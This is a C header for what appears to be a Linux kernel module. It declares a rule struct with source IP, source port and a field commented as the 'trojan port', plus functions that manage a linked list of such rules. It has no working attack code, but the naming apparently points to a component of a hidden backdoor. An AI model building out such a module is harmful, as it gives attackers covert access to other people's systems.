#ifndef __RULE_H__
#define __RULE_H__

#include <linux/list.h>

typedef struct rule
{
    unsigned int sip;
    unsigned short sport;
    unsigned short trojanport; // 木马端口
    struct list_head node;
} rule_t;

rule_t *rule_malloc(void);
void rule_free(rule_t *p);
void rule_init(rule_t *prule, const char *sip, unsigned short sport, unsigned short trojanport);
void rule_list_init(rule_t *head);
void rule_list_free(rule_t *head);
void rule_list_add(rule_t *node, rule_t *head);
void rule_list_remove(rule_t *node, rule_t *head);
bool rule_compare(rule_t *rule1, rule_t *rule2);

#endif